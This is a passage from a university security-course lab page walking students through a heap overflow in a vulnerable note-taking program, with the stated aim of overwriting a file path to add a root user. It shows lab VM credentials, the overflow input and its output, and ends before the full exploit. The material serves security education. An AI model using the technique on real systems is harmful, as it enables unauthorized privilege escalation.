
<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>Tutorial: Heap overflow exploit - Abusing the file system &#8212; Exercises 2022 documentation</title>
    <link rel="stylesheet" href="../_static/bootstrap-sphinx.css" type="text/css" />
    <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
    <link rel="stylesheet" href="../_static/css/my-style.css" type="text/css" />
    <script type="text/javascript" id="documentation_options" data-url_root="../" src="../_static/documentation_options.js"></script>
    <script type="text/javascript" src="../_static/jquery.js"></script>
    <script type="text/javascript" src="../_static/underscore.js"></script>
    <script type="text/javascript" src="../_static/doctools.js"></script>
    <script type="text/javascript" src="../_static/language_data.js"></script>
    <link rel="shortcut icon" href="../_static/favicon.ico"/>
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="Tutorial: Exploit using the Environment" href="en-var.html" />
    <link rel="prev" title="Tutorial: Heap overflow exploit - Function pointers" href="heapoverflow.html" />

<meta charset='utf-8'>
<meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'>
<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1'>
<meta name="apple-mobile-web-app-capable" content="yes">
<script type="text/javascript" src="../_static/js/jquery-1.12.4.min.js "></script>
<script type="text/javascript" src="../_static/js/jquery-fix.js "></script>
<script type="text/javascript" src="../_static/bootstrap-3.4.1/js/bootstrap.min.js "></script>
<script type="text/javascript" src="../_static/bootstrap-sphinx.js "></script>

<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js"></script>
<script type="text/javascript" src="../_static/js/jquery-1.11.0.min.js "></script>
<script type="text/javascript" src="../_static/js/jquery-fix.js "></script>
<script type="text/javascript" src="../_static/script.js"></script>





  </head><body>

  <div id="navbar" class="navbar navbar-inverse navbar-default navbar-fixed-top">
    <div class="container">
      <div class="navbar-header">
        <!-- .btn-navbar is used as the toggle for collapsed navbar content -->
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".nav-collapse">
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a class="navbar-brand" href="../index.html"><span><img src="../_static/UCLouvain_Logo+moodle.png"></span>
          LINGI2144</a>
        <span class="navbar-text navbar-version pull-left"><b>2022</b></span>
      </div>

        <div class="collapse navbar-collapse nav-collapse">
          <ul class="nav navbar-nav">
            
                <li><a href="/index.html">Main</a></li>
                <li><a href="/theory/index.html">Theory</a></li>
                <li><a href="/qcm/index.html">MCQ</a></li>
            
            
              <li class="dropdown globaltoc-container">
  <a role="button"
     id="dLabelGlobalToc"
     data-toggle="dropdown"
     data-target="#"
     href="../index.html">Section <b class="caret"></b></a>
  <ul class="dropdown-menu globaltoc"
      role="menu"
      aria-labelledby="dLabelGlobalToc"><ul>
<li class="toctree-l1"><a class="reference internal" href="../tp0/tp.html">Tutorial 0: Initiation</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../tp0/tp.html#exercise">Exercise</a></li>
<li class="toctree-l2"><a class="reference internal" href="../tp0/tp.html#bonus-going-beyond">Bonus: going beyond</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../tp1/tp.html">Tutorial 1: Race conditions</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../tp1/tp.html#prerequisite">Prerequisite</a></li>
<li class="toctree-l2"><a class="reference internal" href="../tp1/tp.html#exercise">Exercise</a></li>
<li class="toctree-l2"><a class="reference internal" href="../tp1/tp.html#nfs-share-exploit-metasploit">NFS Share exploit - Metasploit</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../tp2/tp.html">Tutorial 2: Memory Safety</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp3/tp.html">Tutorial 3: Debugging with <code class="docutils literal notranslate"><span class="pre">GDB</span></code></a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp4/tp.html">Tutorial 4: Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp5/tp.html">Tutorial 5: Buffer Overflows and Shellcodes</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp6/tp.html">Tutorial 6: Protection</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp7/tp.html">Tutorial 7: Format String</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp8/tp.html">Tutorial 8: YARA</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp9/tp.html">Tutorial 9: Dynamic Analysis</a></li>
</ul>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="extra.html">Setting up the lab environment</a><ul>
<li class="toctree-l2"><a class="reference internal" href="extra.html#download-a-vm-manager">Download a VM manager</a></li>
<li class="toctree-l2"><a class="reference internal" href="extra.html#grab-your-kali-linux-image">Grab your Kali Linux Image</a></li>
<li class="toctree-l2"><a class="reference internal" href="extra.html#bonus-make-yourself-at-home">Bonus : Make yourself at home !</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="gdb.html">Tutorial: Complement on GDB</a><ul>
<li class="toctree-l2"><a class="reference internal" href="gdb.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="gdb.html#exercise">Exercise</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="handmadeshellcode.html">Tutorial:  Handmade Shellcode</a><ul>
<li class="toctree-l2"><a class="reference internal" href="handmadeshellcode.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="handmadeshellcode.html#from-c-to-shellcode">From C to shellcode</a></li>
<li class="toctree-l2"><a class="reference internal" href="handmadeshellcode.html#removing-null-bytes">Removing Null bytes</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="stackstethoscope.html">Tutorial:  ByPassing ASLR - Stack Stethoscope</a><ul>
<li class="toctree-l2"><a class="reference internal" href="stackstethoscope.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="stackstethoscope.html#exercise">Exercise</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="nfsshare2.html">Tutorial:  NFS Share exploit - Shellcode</a><ul>
<li class="toctree-l2"><a class="reference internal" href="nfsshare2.html#prerequisite">Prerequisite</a></li>
<li class="toctree-l2"><a class="reference internal" href="nfsshare2.html#exercise">Exercise</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="heapoverflow.html">Tutorial:  Heap overflow exploit - Function pointers</a><ul>
<li class="toctree-l2"><a class="reference internal" href="heapoverflow.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="heapoverflow.html#exercise">Exercise</a></li>
</ul>
</li>
<li class="toctree-l1 current"><a class="current reference internal" href="#">Tutorial:  Heap overflow exploit - Abusing the file system</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="#exercise">Exercise</a></li>
<li class="toctree-l2"><a class="reference internal" href="#gaining-root-access">Gaining root access</a></li>
<li class="toctree-l2"><a class="reference internal" href="#bonus">BONUS</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="en-var.html">Tutorial: Exploit using the Environment</a><ul>
<li class="toctree-l2"><a class="reference internal" href="en-var.html#requirements">Requirements</a></li>
<li class="toctree-l2"><a class="reference internal" href="en-var.html#adding-environment-variable">Adding environment variable</a></li>
<li class="toctree-l2"><a class="reference internal" href="en-var.html#go-even-further">Go even further</a></li>
</ul>
</li>
</ul>
</ul>
</li>
              
            
            
            
            
            
          </ul>

          
            
<form class="navbar-form navbar-right" action="../search.html" method="get">
 <div class="form-group">
  <input type="text" name="q" class="form-control" placeholder="Search" />
 </div>
  <input type="hidden" name="check_keywords" value="yes" />
  <input type="hidden" name="area" value="default" />
</form>
          
        </div>
    </div>
  </div>

<div class="container" >
  <div class="row">
      <div class="col-md-3">
        <div id="sidebar" class="bs-sidenav" role="complementary">
<form action="../search.html" method="get">
 <div class="form-group">
  <input type="text" name="q" class="form-control" placeholder="Search" />
 </div>
  <input type="hidden" name="check_keywords" value="yes" />
  <input type="hidden" name="area" value="default" />
</form><ul>
<li><a class="reference internal" href="#">Tutorial:  Heap overflow exploit - Abusing the file system</a><ul>
<li><a class="reference internal" href="#introduction">Introduction</a></li>
<li><a class="reference internal" href="#exercise">Exercise</a><ul>
<li><a class="reference internal" href="#finding-vulnerable-code">Finding vulnerable code</a></li>
<li><a class="reference internal" href="#locate-the-heap-in-memory">Locate the heap in memory</a></li>
<li><a class="reference internal" href="#locate-the-two-buffers">Locate the two buffers</a></li>
<li><a class="reference internal" href="#predicting-the-file-name">Predicting the file name</a></li>
</ul>
</li>
<li><a class="reference internal" href="#gaining-root-access">Gaining root access</a><ul>
<li><a class="reference internal" href="#create-a-new-user">Create a new user</a></li>
</ul>
</li>
<li><a class="reference internal" href="#bonus">BONUS</a></li>
</ul>
</li>
</ul>
<div class="row autorization" style="padding-top: 20px">
    <div class="col-xs-4 col-md-6">
        <form id="pdf_tp" target="_blank" style="text-align:center;" method="get" action="">
            <button style="text-align:center; border-radius:12px;" type="submit" class="up">
                <svg id="Capa_1"
                     width="50px" height="50px"
                     enable-background="new 0 0 512 512" height="512" viewBox="0 0 512 512" width="512" xmlns="http://www.w3.org/2000/svg"><g><g><path d="m393.5 151.547v263.953c0 22.091-17.909 40-40 40h-275c-22.091 0-40-17.909-40-40v-368c0-22.091 17.909-40 40-40h171.197c7.968 0 15.608 3.17 21.236 8.809l113.803 114.047c5.612 5.625 8.764 13.246 8.764 21.191z" fill="#f9f8f9"/><path d="m393.5 151.55v17.59h-104.32c-31.45 0-57.04-25.62-57.04-57.1v-104.54h17.56c7.96 0 15.6 3.17 21.23 8.81l113.81 114.05c5.61 5.62 8.76 13.24 8.76 21.19z" fill="#e3e0e4"/><path d="m108.5 455.5h-30c-22.09 0-40-17.91-40-40v-368c0-22.09 17.91-40 40-40h30c-22.09 0-40 17.91-40 40v368c0 22.09 17.91 40 40 40z" fill="#e3e0e4"/><g fill="#a29aa5"><path d="m219.608 157.5h-123.7c-4.142 0-7.5-3.358-7.5-7.5s3.358-7.5 7.5-7.5h123.7c4.142 0 7.5 3.358 7.5 7.5s-3.358 7.5-7.5 7.5z"/><path d="m219.608 337.5h-123.7c-4.142 0-7.5-3.358-7.5-7.5s3.358-7.5 7.5-7.5h123.7c4.142 0 7.5 3.358 7.5 7.5s-3.358 7.5-7.5 7.5z"/><path d="m317.908 217.5h-224c-4.142 0-7.5-3.358-7.5-7.5s3.358-7.5 7.5-7.5h224c4.142 0 7.5 3.358 7.5 7.5s-3.358 7.5-7.5 7.5z"/><path d="m317.908 277.5h-224c-4.142 0-7.5-3.358-7.5-7.5s3.358-7.5 7.5-7.5h224c4.142 0 7.5 3.358 7.5 7.5s-3.358 7.5-7.5 7.5z"/><path d="m390.81 139.14h-101.63c-14.93 0-27.04-12.14-27.04-27.1v-101.82c3.24 1.46 6.23 3.52 8.79 6.09l113.81 114.05c2.55 2.56 4.61 5.54 6.07 8.78z"/></g><ellipse cx="371.989" cy="403" fill="#80e29e" rx="101.511" ry="101.5"/><path d="m453.07 464.07c-18.52 24.56-47.95 40.43-81.08 40.43-56.06 0-101.51-45.44-101.51-101.5 0-33.13 15.87-62.55 40.43-81.07-12.83 16.99-20.43 38.14-20.43 61.07 0 56.06 45.45 101.5 101.51 101.5 22.93 0 44.08-7.6 61.08-20.43z" fill="#77d192"/><path d="m423.124 410.243c-4.008-7.25-13.135-9.881-20.386-5.873l-15.747 8.701v-45.572c0-8.284-6.717-15-15.002-15s-15.002 6.716-15.002 15v45.573l-15.747-8.701c-7.252-4.007-16.378-1.377-20.386 5.873-4.007 7.251-1.377 16.377 5.875 20.384l38.004 21c.091.05.184.093.275.141.139.073.278.146.419.214.167.082.336.158.505.232.125.055.25.111.377.163.198.081.398.156.598.228.099.036.197.073.297.107.24.081.481.153.723.222.064.018.127.038.191.055.287.077.576.144.865.204.023.005.046.011.069.015.971.194 1.95.294 2.924.294l-.001-.003h.015c2.497 0 4.997-.623 7.256-1.872l38.004-21c7.251-4.008 9.881-13.134 5.874-20.385z" fill="#f9f8f9"/></g><g><path d="m38.5 129.5c4.143 0 7.5-3.358 7.5-7.5v-74.5c0-17.92 14.581-32.5 32.504-32.5h171.215c1.687 0 3.339.203 4.946.562v96.474c0 19.08 15.497 34.603 34.546 34.603h96.274c.354 1.595.553 3.235.553 4.908v40.453c0 4.142 3.357 7.5 7.5 7.5s7.5-3.358 7.5-7.5v-40.453c0-10.002-3.892-19.409-10.957-26.488l-113.815-114.047c-7.087-7.101-16.515-11.012-26.547-11.012h-171.215c-26.193 0-47.504 21.309-47.504 47.5v74.5c0 4.142 3.357 7.5 7.5 7.5zm336.956 2.139h-86.245c-10.777 0-19.546-8.793-19.546-19.603v-86.404z"/><path d="m171 448h-92.496c-17.923 0-32.504-14.58-32.504-32.5v-258.5c0-4.142-3.357-7.5-7.5-7.5s-7.5 3.358-7.5 7.5v258.5c0 26.191 21.311 47.5 47.504 47.5h92.496c4.143 0 7.5-3.358 7.5-7.5s-3.357-7.5-7.5-7.5z"/><path d="m95.914 157.5h123.713c4.143 0 7.5-3.358 7.5-7.5s-3.357-7.5-7.5-7.5h-123.713c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5z"/><path d="m95.914 322.5c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5h123.713c4.143 0 7.5-3.358 7.5-7.5s-3.357-7.5-7.5-7.5z"/><path d="m317.938 202.5h-224.025c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5h224.024c4.143 0 7.5-3.358 7.5-7.5s-3.357-7.5-7.499-7.5z"/><path d="m325.438 270c0-4.142-3.357-7.5-7.5-7.5h-224.025c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5h224.024c4.143 0 7.501-3.358 7.501-7.5z"/><path d="m401.038 297.936v-70.936c0-4.142-3.357-7.5-7.5-7.5s-7.5 3.358-7.5 7.5v67.903c-4.6-.594-9.289-.903-14.049-.903-34.387 0-66.05 15.725-86.87 43.142-2.506 3.299-1.862 8.003 1.437 10.509 3.301 2.506 8.005 1.861 10.509-1.438 17.959-23.649 45.268-37.213 74.924-37.213 6.868 0 13.564.747 20.017 2.152.011.002.021.005.032.007 42.237 9.211 73.962 46.888 73.962 91.841 0 51.832-42.173 94-94.011 94s-94.011-42.168-94.011-94c0-9.542 1.423-18.95 4.229-27.965 1.231-3.955-.978-8.159-4.933-9.39-3.956-1.23-8.159.978-9.39 4.932-3.256 10.459-4.906 21.368-4.906 32.423 0 16.037 3.484 31.275 9.731 45h-66.709c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5h75.028c19.528 29.501 53.008 49 90.961 49 60.109 0 109.011-48.897 109.011-109 0-50.048-33.911-92.319-79.962-105.064z"/><path d="m371.989 344.999c-12.407 0-22.502 10.093-22.502 22.5v32.859l-4.619-2.552c-10.857-6.001-24.574-2.048-30.578 8.81-2.907 5.26-3.591 11.338-1.927 17.113s5.479 10.556 10.739 13.463l38.003 21c6.646 3.71 15.127 3.734 21.767 0l38.004-21c5.261-2.907 9.075-7.688 10.739-13.463s.98-11.853-1.928-17.115c-6.003-10.857-19.721-14.81-30.577-8.808l-4.619 2.552v-32.859c0-12.407-10.095-22.5-22.502-22.5zm34.376 65.935c3.617-1.999 8.192-.682 10.194 2.937 2.023 3.489.632 8.315-2.938 10.192l-38.006 21.001c-2.328 1.295-5.291 1.189-7.563-.171l-37.696-20.83c-3.569-1.876-4.96-6.703-2.938-10.19 2.003-3.621 6.577-4.938 10.195-2.938l15.746 8.701c4.749 2.823 11.296-1.04 11.128-6.564v-45.573c0-4.136 3.365-7.5 7.502-7.5s7.502 3.364 7.502 7.5v45.572c-.17 5.534 6.367 9.39 11.127 6.564z"/></g></g>
                </svg>
                <br> <b> PDF </b>
            </button>
        </form>
    </div>
    <div class="col-xs-4 col-md-6">
        <form id="rar_tp"  target="_blank" style="text-align:center;" method="get" action="">
            <button style="text-align:center; border-radius:12px;" type="submit" class="up">
                <svg id="Capa_1"
                     width="50px" height="50px"
                     enable-background="new 0 0 512 512" height="512" viewBox="0 0 512 512" width="512" xmlns="http://www.w3.org/2000/svg"><g><g><path d="m453.31 460.125c0 24.508-19.907 44.375-44.464 44.375h-305.692c-24.557 0-44.464-19.867-44.464-44.375v-408.25c0-24.508 19.907-44.375 44.464-44.375h190.303c8.857 0 17.35 3.516 23.606 9.773l126.505 126.521c6.239 6.239 9.742 14.694 9.742 23.508z" fill="#f9f8f9"/><path d="m133.15 504.5h-30c-24.55 0-44.46-19.87-44.46-44.38v-408.24c0-24.51 19.91-44.38 44.46-44.38h30c-24.55 0-44.46 19.87-44.46 44.38v408.24c0 24.51 19.91 44.38 44.46 44.38z" fill="#e3e0e4"/><path d="m453.31 167.3v16.24h-115.96c-33.12 0-60.06-26.95-60.06-60.07v-115.97h16.17c8.85 0 17.35 3.52 23.6 9.77l126.51 126.52c6.24 6.24 9.74 14.7 9.74 23.51z" fill="#e3e0e4"/><path d="m450.32 153.54h-112.97c-16.6 0-30.06-13.46-30.06-30.07v-112.96c3.61 1.63 6.92 3.91 9.77 6.76l126.51 126.52c2.85 2.85 5.12 6.15 6.75 9.75z" fill="#b9a1d3"/><path d="m435 438.5h-358c-22.091 0-40-17.909-40-40v-146c0-22.091 17.909-40 40-40h358c22.091 0 40 17.909 40 40v146c0 22.091-17.909 40-40 40z" fill="#b9a1d3"/><path d="m102 438.5h-25c-22.09 0-40-17.91-40-40v-146c0-22.09 17.91-40 40-40h25c-22.09 0-40 17.91-40 40v146c0 22.09 17.91 40 40 40z" fill="#9573bb"/></g><g><path d="m58.689 153.851c4.143 0 7.5-3.357 7.5-7.5v-94.476c0-20.333 16.582-36.875 36.965-36.875h111.42c4.143 0 7.5-3.357 7.5-7.5s-3.357-7.5-7.5-7.5h-111.42c-28.653 0-51.965 23.271-51.965 51.875v94.476c0 4.142 3.358 7.5 7.5 7.5z"/><path d="m460.811 212.656v-45.354c0-10.879-4.24-21.111-11.938-28.811l-126.506-126.52c-7.718-7.72-17.985-11.971-28.91-11.971h-43.394c-4.143 0-7.5 3.357-7.5 7.5s3.357 7.5 7.5 7.5h43.394c2.165 0 4.288.264 6.334.775v107.696c0 20.714 16.85 37.566 37.561 37.566h107.694c.505 2.025.765 4.125.765 6.265v38.954c-3.476-.812-7.092-1.256-10.811-1.256h-23.319c-4.143 0-7.5 3.357-7.5 7.5s3.357 7.5 7.5 7.5h23.319c17.921 0 32.5 14.579 32.5 32.5v146c0 17.921-14.579 32.5-32.5 32.5h-268.66c-4.143 0-7.5 3.357-7.5 7.5s3.357 7.5 7.5 7.5h268.66c3.719 0 7.335-.444 10.811-1.256v15.381c0 20.333-16.582 36.875-36.965 36.875h-305.692c-20.383 0-36.965-16.542-36.965-36.875v-15.381c3.476.812 7.092 1.256 10.811 1.256h53.319c4.143 0 7.5-3.357 7.5-7.5s-3.357-7.5-7.5-7.5h-53.319c-17.921 0-32.5-14.579-32.5-32.5v-146c0-17.921 14.579-32.5 32.5-32.5h299.702c4.143 0 7.5-3.357 7.5-7.5s-3.357-7.5-7.5-7.5h-299.702c-3.719 0-7.335.444-10.811 1.256v-24.905c0-4.143-3.357-7.5-7.5-7.5s-7.5 3.357-7.5 7.5v31.305c-13.04 8.477-21.689 23.165-21.689 39.844v146c0 16.679 8.649 31.367 21.689 39.844v21.781c0 28.604 23.312 51.875 51.965 51.875h305.691c28.653 0 51.965-23.271 51.965-51.875v-21.781c13.041-8.477 21.689-23.165 21.689-39.844v-146c.001-16.679-8.648-31.367-21.688-39.844zm-146.02-89.185v-97.863l120.414 120.429h-97.854c-12.439 0-22.56-10.123-22.56-22.566z"/><path d="m265.669 264.091c-1.584-3.853-5.297-6.341-9.462-6.341-.003 0-.006 0-.009 0-4.168.004-7.882 2.499-9.461 6.356-.023.057-.046.114-.067.172l-45.247 118.803c-1.475 3.87.469 8.203 4.34 9.678 3.865 1.475 8.203-.468 9.678-4.34l9.429-24.757h62.347l9.335 24.736c1.458 3.914 5.891 5.823 9.665 4.368 3.875-1.462 5.831-5.789 4.368-9.665l-44.836-118.808c-.025-.067-.053-.135-.08-.202zm-35.087 84.571 25.603-67.226 25.37 67.226z"/><path d="m181.648 296.566c0-21.403-18.208-38.816-40.589-38.816h-32.021c-.007 0-.013.001-.02.001-.006 0-.013-.001-.019-.001-4.143 0-7.5 3.357-7.5 7.5v120.5c0 4.143 3.357 7.5 7.5 7.5s7.5-3.357 7.5-7.5v-50.27c1.064-.006 2.204-.012 3.398-.018l48.62 55.243c2.745 3.118 7.488 3.403 10.585.675 3.109-2.736 3.411-7.476.675-10.585l-39.967-45.411c.438 0 .862-.001 1.249-.001 22.381 0 40.589-17.413 40.589-38.817zm-40.588-23.816c13.87 0 25.589 10.906 25.589 23.816s-11.719 23.816-25.589 23.816c-5.593 0-16.825.056-24.342.096-.042-7.433-.099-18.474-.099-23.912 0-4.577-.032-16.093-.057-23.816z"/><path d="m410.5 296.566c0-21.403-18.208-38.816-40.589-38.816h-32.021c-.007 0-.013.001-.02.001-.006 0-.013-.001-.019-.001-4.143 0-7.5 3.357-7.5 7.5v120.5c0 4.143 3.357 7.5 7.5 7.5s7.5-3.357 7.5-7.5v-50.27c1.064-.006 2.204-.012 3.398-.018l48.62 55.243c2.745 3.118 7.488 3.403 10.585.675 3.109-2.736 3.411-7.476.675-10.585l-39.967-45.411c.438 0 .862-.001 1.249-.001 22.381 0 40.589-17.413 40.589-38.817zm-40.589-23.816c13.87 0 25.589 10.906 25.589 23.816s-11.719 23.816-25.589 23.816c-5.593 0-16.825.056-24.342.096-.042-7.433-.099-18.474-.099-23.912 0-4.577-.032-16.093-.057-23.816z"/></g></g>
                </svg>
                <br> <b> Files </b>
            </button>
        </form>
    </div>
    <div class="col-xs-4 col-md-12">
        <form id="vid_tp" style="text-align:center;">
	<a id="notUp"  href="#!" style="text-align:center;"
   data-title="Watch now on youtube">
            <button class="video-btn up" onclick="topFunction()"
                    style="text-align:center; border-radius:12px;" data-toggle="modal" type="button"
                    data-target="#myModal"
                    data-src="">
                <?xml version="1.0" encoding="iso-8859-1"?>
<!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<svg width="50px" height="50px" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 viewBox="0 0 512.003 512.003" style="enable-background:new 0 0 512.003 512.003;" xml:space="preserve">
<path style="fill:#E53935;" d="M443.734,80.336L330.86,70.437c-49.812-4.334-99.906-4.334-149.717,0L68.268,80.336
	c-38.702,3.124-68.459,35.541-68.267,74.368v202.667c-0.204,38.835,29.557,71.265,68.267,74.389l112.939,9.813
	c24.832,2.133,49.835,3.243,74.859,3.243c25.024,0,50.027-1.067,74.859-3.243l112.939-9.813c38.659-3.187,68.348-35.6,68.139-74.389
	V154.704C512.194,115.877,482.436,83.459,443.734,80.336z"/>
<path style="fill:#FAFAFA;" d="M357.782,247.077l-149.333-96c-4.951-3.193-11.552-1.768-14.745,3.183
	c-1.111,1.722-1.702,3.728-1.703,5.777v192c0.002,5.891,4.78,10.665,10.671,10.663c2.049-0.001,4.055-0.592,5.777-1.703l149.333-96
	c4.954-3.187,6.387-9.787,3.2-14.742c-0.825-1.283-1.917-2.374-3.2-3.2V247.077z"/>
<path d="M256.001,444.816c-25.003,0-50.005-1.088-74.837-3.243l-112.896-9.835c-38.71-3.124-68.471-35.554-68.267-74.389V154.683
	c-0.182-38.819,29.573-71.224,68.267-74.347l112.896-9.899c49.797-4.334,99.877-4.334,149.675,0l112.96,9.813
	c38.717,3.158,68.454,35.629,68.203,74.475v202.667c0.204,38.835-29.557,71.265-68.267,74.389l0,0l-112.96,9.813
	C306.028,443.771,281.004,444.816,256.001,444.816z M256.001,88.549c-24.405,0-48.768,1.067-72.981,3.157L69.953,101.52
	c-27.614,2.317-48.794,25.495-48.619,53.205v202.667c-0.116,27.7,21.097,50.827,48.704,53.099l112.96,9.813
	c48.57,4.209,97.414,4.209,145.984,0l113.067-9.813c27.589-2.315,48.76-25.456,48.619-53.141V154.683
	c0.116-27.7-21.097-50.827-48.704-53.099l-112.96-9.813c-24.235-2.105-48.569-3.164-73.003-3.179V88.549z"/>
<path d="M202.668,362.704c-5.891,0-10.667-4.776-10.667-10.667v-192c-0.01-5.891,4.758-10.674,10.649-10.684
	c2.057-0.003,4.07,0.588,5.799,1.703l149.333,96c4.96,3.178,6.405,9.776,3.227,14.736c-0.83,1.296-1.931,2.397-3.227,3.227
	l-149.333,96C206.724,362.124,204.717,362.709,202.668,362.704z M213.334,179.579v152.917l118.933-76.459L213.334,179.579z"/>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
</svg>

                <br> <b>  Video </b>
            </button>
        </a>
</form>

  <!-- Modal -->
  <!-- Modal -->
  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"
    aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">

        <div class="modal-body">

          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
          <!-- 16:9 aspect ratio -->
          <div id="video-view" class="embed-responsive embed-responsive-16by9">

          </div>
        </div>
      </div>
    </div>
  </div>
    </div>
</div>
        </div>
      </div>
    <div class="body col-md-9 content" role="main" >
      
  <div class="section" id="tutorial-heap-overflow-exploit-abusing-the-file-system">
<h1>Tutorial:  Heap overflow exploit - Abusing the file system<a class="headerlink" href="#tutorial-heap-overflow-exploit-abusing-the-file-system" title="Permalink to this headline">¶</a></h1>
<div class="section" id="introduction">
<h2>Introduction<a class="headerlink" href="#introduction" title="Permalink to this headline">¶</a></h2>
<p>Download the Kali VM from this link (Same than NFS - Metasploitable)</p>
<p class="centered">
<strong><a class="reference external" href="https://transvol.sgsi.ucl.ac.be/download.php?id=cdb293424a0498c7">https://transvol.sgsi.ucl.ac.be/download.php?id=cdb293424a0498c7</a></strong></p><div class="line-block">
<div class="line">Working directory: <code class="docutils literal notranslate"><span class="pre">~/SecurityClass/Tutorial-Extra</span></code></div>
<div class="line">Connection:</div>
</div>
<table border="1" class="docutils">
<colgroup>
<col width="50%" />
<col width="50%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head"><strong>username</strong></th>
<th class="head"><strong>password</strong></th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>admin</td>
<td>nimda</td>
</tr>
</tbody>
</table>
<div class="admonition warning">
<p class="first admonition-title">Warning</p>
<p class="last"><strong>Before you start this exercise I STRONGLY suggest that you backup
any important file on your VM ‼️</strong></p>
</div>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ cp /etc/passwd /tmp/passwd.bkup
</pre></div>
</div>
<p>In this exercise, we will see how we can exploit the heap to create a
new user with root access.</p>
<p>The program we will be exploiting is a simple note taker that will write
the user input into a file located at <code class="docutils literal notranslate"><span class="pre">/var/notes</span></code>. This simple piece
of code is poorly written and is vulnerable to a heap-based overflow.</p>
<p>We can try this program with some simple input like :</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ ./note_taker &quot;Some boring text&quot;
[DEBUG] buffer @ 0x804d1a0: &#39;Some boring text&#39;
[DEBUG] datafile @ 0x804d210: &#39;/var/notes&#39;
Note has been saved.
$ sudo cat /var/notes

Some boring text
$
</pre></div>
</div>
<div class="collapse tp1_s0" id="tp1_0_1">
       <div class="panel panel-primary">
     <div class="panel-body"><p>We can try this program with some simple input like :</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ ./note_taker &quot;Some boring text&quot;
[DEBUG] buffer @ 0x804d1a0: &#39;Some boring text&#39;
[DEBUG] datafile @ 0x804d210: &#39;/var/notes&#39;
Note has been saved.
$ sudo cat /var/notes

Some boring text
$
</pre></div>
</div>
<p>However if we try with a longer input, let’s say of size 120, we get the
following output :</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ ./note_taker $(perl -e &#39;print &quot;A&quot;x120&#39;)
[DEBUG] buffer @ 0x804d1a0: &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;
[DEBUG] datafile @ 0x804d210: &#39;AAAAAAAA&#39;
Note has been saved.
double free or corruption (out)
Aborted
$ ls
AAAAAAAA  note_taker  note_taker.c  README.md
$ sudo cat AAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$
</pre></div>
</div>
<div class="line-block">
<div class="line">We can see that the datafile variable has been overwritten and that the program has effectively created the note in the current folder under the file <cite>AAAAAAAA</cite>.</div>
<div class="line">Let’s now see how we can exploit this.</div>
</div>
</div>
</div>
</div></div>
<div class="section" id="exercise">
